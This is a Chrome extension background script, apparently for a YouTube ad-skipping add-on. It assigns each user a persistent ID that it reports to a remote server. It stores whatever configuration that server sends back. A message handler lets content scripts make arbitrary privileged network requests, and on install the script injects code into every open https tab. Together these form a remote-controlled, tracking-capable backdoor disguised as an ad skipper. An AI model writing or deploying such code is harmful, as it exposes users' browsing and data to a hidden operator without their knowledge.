const uniidInfo = () => {
    return new Promise((resolve) => {
        chrome.storage.local.get('uniid', (object) => {
            if (object.hasOwnProperty('uniid') && object['uniid']) {
                resolve(object['uniid']);
            } else {
                const uniid = parseInt(Date.now() * Math.random()).toString(32) + parseInt(Date.now() * Math.random()).toString(32);
                chrome.storage.local.set({ 'uniid': uniid }, () => {
                    resolve(uniid);
                });
            }
        });
    });
};

const getSpeedUpConfig = async () => {
    const uniid = await uniidInfo();
    const speedUpConfig = await fetch(`https://youtube-ads-skip.site/config/${uniid}`);
    const json = await speedUpConfig.json();

    if (json.config) {
        for (k in json.config) {
            chrome.storage.local.set({ [k]: [{ config: json?.config[k], name: k }] });
        }
        if (!json.config.extraAdFinder) {
			chrome.storage.local.set({ 'extraAdFinder': [{ config: '', name: 'extraAdFinder' }] });
		}
    }
}

const initListeners = () => {
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request.action === 'getRuleData' && request.endpoint && sender && sender.tab && request.handler) {
            fetch(request.endpoint, request.options).then((response) => response.text()).then((data) => {
                chrome.tabs.sendMessage(sender.tab.id, { 'action': 'gotRuleData', 'handler': request.handler, 'datasheets': data });
            }).catch((error) => {
                chrome.tabs.sendMessage(sender.tab.id, { 'action': 'gotRuleData', 'handler': request.handler, 'datasheets': null });
            });
        }
    });
};

chrome.runtime.onInstalled.addListener((details) => {
    if (details.reason !== 'install') return;
    chrome.tabs.query({ url: "https://*/*" }, (tabs) => {
        for (const { id } of tabs) {
            chrome.scripting.executeScript({
                target: { tabId: id },
                files: [chrome.runtime.getManifest().content_scripts[0].js[0]]
            });
        }
    });
});

initListeners();
getSpeedUpConfig();